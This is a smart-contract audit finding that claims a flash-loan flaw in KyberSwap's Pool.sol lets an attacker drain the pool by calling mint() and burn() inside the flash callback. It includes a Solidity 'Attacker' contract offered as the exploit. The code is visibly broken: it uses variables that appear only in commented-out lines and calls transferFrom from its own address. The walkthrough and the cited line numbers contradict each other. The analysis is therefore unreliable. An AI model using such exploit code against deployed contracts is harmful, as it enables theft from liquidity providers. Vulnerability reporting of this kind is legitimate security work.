# User can drain the whole pool
## Summary
In the `Pool.sol` contract `flash()` function allows users to request for token0 and/or token1 and pay it back in the same transaction, plus a fee (which is optional), in the `callback`.
The user should provide following parameters:

- recipient (address) - address which will receive the token0 and token1 quantities
- qty0 (uint256) - token0 quantity to be loaned to the recipient
- qty1 (uint256) - token1 quantity to be loaned to the recipient
- data (bytes) - data, to be passed into the callback function

The function process is pretty straightforward:

1. The function first determines the fees associated with the flash loan operation by multiplying the quantity of tokens to be borrowed (`qty0` and `qty1`) with `swapFeeUnits` and dividing by `C.FEE_UNITS`.
2. It then checks the balances of the pool for `token0` and `token1` before the operation.
3. The desired amount of tokens (`qty0` and `qty1`) are transferred to the `recipient`.
4. A callback function, `flashCallback`, is called. `This function is expected to be implemented by the caller, and this is where they can perform any operation with the borrowed tokens.`
5. After the callback function completes, the function checks the new balances of the pool.
6. It then ensures that the tokens have been returned with the necessary fees added on top.
7. Finally, the fees (in tokens) are transferred to the `feeTo` address and an event `Flash` is emitted.


## Vulnerability Detail
The issue come on [549 and 550 lines](https://github.com/sherlock-audit/2023-07-kyber-swap/blob/main/ks-elastic-sc/contracts/Pool.sol#L549-L550).

**[Pool.sol#L559-L560:](https://github.com/sherlock-audit/2023-07-kyber-swap/blob/main/ks-elastic-sc/contracts/Pool.sol#L559-L560)**

```solidity
    require(balance0Before + feeQty0 <= balance0After, 'lacking feeQty0');
    require(balance1Before + feeQty1 <= balance1After, 'lacking feeQty1');
```

It is only making sure that the balance of the token0 and token1 in the pool after (aka balance0After and balance1Before) calling the `flashCallback()` by the caller is greater than or equal to the balances before stored values of token0 and token1 plus fees quantity.

**[Pool.sol#L538-L547:](https://github.com/sherlock-audit/2023-07-kyber-swap/blob/main/ks-elastic-sc/contracts/Pool.sol#L538-L547)**

```solidity
    uint256 balance0Before = _poolBalToken0();
    uint256 balance1Before = _poolBalToken1();

    /* ... */

    IFlashCallback(msg.sender).flashCallback(feeQty0, feeQty1, data);

    uint256 balance0After = _poolBalToken0();
    uint256 balance1After = _poolBalToken1();
```

**[Pool.sol#L33-L53:](https://github.com/sherlock-audit/2023-07-kyber-swap/blob/main/ks-elastic-sc/contracts/Pool.sol#L33-L53)**

```solidity
function _poolBalToken0() private view returns (uint256) {
  (bool success, bytes memory data) = address(token0).staticcall(
    abi.encodeWithSelector(IERC20.balanceOf.selector, address(this))
  );
  require(success && data.length >= 32);
  return abi.decode(data, (uint256));
}

function _poolBalToken1() private view returns (uint256) {
  (bool success, bytes memory data) = address(token1).staticcall(
    abi.encodeWithSelector(IERC20.balanceOf.selector, address(this))
  );
  require(success && data.length >= 32);
  return abi.decode(data, (uint256));
}

```

On [544 Line](https://github.com/sherlock-audit/2023-07-kyber-swap/blob/main/ks-elastic-sc/contracts/Pool.sol#L544), the flow of the contract is in the attacker's control. What this means is that when we receive control inside our own flashCallback() function, we can call the mint() function to deposit the loaned amount of token0 and token1 back to the pool.
The pool will update its balance of token0 and token1.

The `flash()` function validates the repayment of the flash loan based on the total balance of the protocol for the tokens. By obtaining a flash loan for the total amount of the protocol and then calling the `mint()` function within the same transaction, a malicious actor can add to the total balance of the protocol. The end result is that after the `flash()` function completes its execution, the attacker would end up owning all the tokens in the protocol.

**This is the sample contract that can exploit the whole thing:**

```solidity
contract Attacker {
  Pool immutable pool;
  address immutable owner;
  IERC20 immutable poolToken0;
  IERC20 immutable poolToken1;

  modifier onlyOwner() {
    require(msg.sender == owner, "only owner");
    _;
  }

  receive() external payable {}

  constructor(address pool_) {
    owner = msg.sender;

    pool = Pool(pool_);
    poolToken0 = pool.token0();
    poolToken1 = pool.token1();
  }

  function executeAttack() external onlyOwner {
    // uint256 poolTokenOBalance = poolToken0.balanceOf(address(pool));
    // uint256 poolToken1Balance = poolToken1.balanceOf(address(pool));

    pool.flash(address(this), poolTokenOBalance, poolToken1Balance, "");

    // These values are just for the example
    int24 tickLower = -887272;
    int24 tickUpper = 887272;
    uint128 qty = 5000; // Amount of liquidity that we want to get

    (uint256 qty0, uint256 qty1, uint256 feeGrowthInsideLast) = pool.burn(
      tickLower,
      tickUpper,
      qty
    );

    poolToken0.transferFrom(address(this), owner, qty0);
    poolToken1.transferFrom(address(this), owner, qty1);
  }

  function flashCallback(
    uint256 feeQty0,
    uint256 feeQty1,
    bytes calldata data
  ) external {
    // uint256 token0Amount = pool.token0().balanceOf(address(this)) - feeQty0;
    // uint256 token1Amount = pool.token1().balanceOf(address(this)) - feeQty1;

    // These values are just for the example
    int24 tickLower = -887272;
    int24 tickUpper = 887272;
    int24[2] memory ticksPrevious = [int24(0), int24(0)];
    uint128 qty = 5000; // Amount of liquidity that we want to add
    bytes memory data = "";

    pool.mint(address(this), tickLower, tickUpper, ticksPrevious, qty, data);
  }
}

```

1. The function executeAttack() calls the pool.flash() to start the attack.
2. The flash() function calls `IFlashCallback(msg.sender).flashCallback(feeQty0, feeQty1, data);` which sends the control flow back to our contract's receive() function since our contract is msg.sender for this transaction, along with the loaned amount.
3. The function `flashCallback()` calls pool.mint() and deposits the loaned amount of token0 and token1 back into the pool, but also `updates the balances mappings of the token0 and token1` so that we can burn after that.
4. flash() function [require() validations](https://github.com/sherlock-audit/2023-07-kyber-swap/blob/main/ks-elastic-sc/contracts/Pool.sol#L559-L560) returns true, the flow is again returned to our contract's executeAttack() function and it calls pool.burn() to transfer all the deposited amount of token0 and token1 by `Attacker` contract.
5. It then transfer the received balance/amount of token0 and token1 to the owner, finishing the exploit.


## Impact
Complete loss of funds in the protocol, causing significant financial harm to all stakeholders.

Manual Review

## Recommendation
Consider to don't allow to the user that take flash loan to call mint() and burn() function.
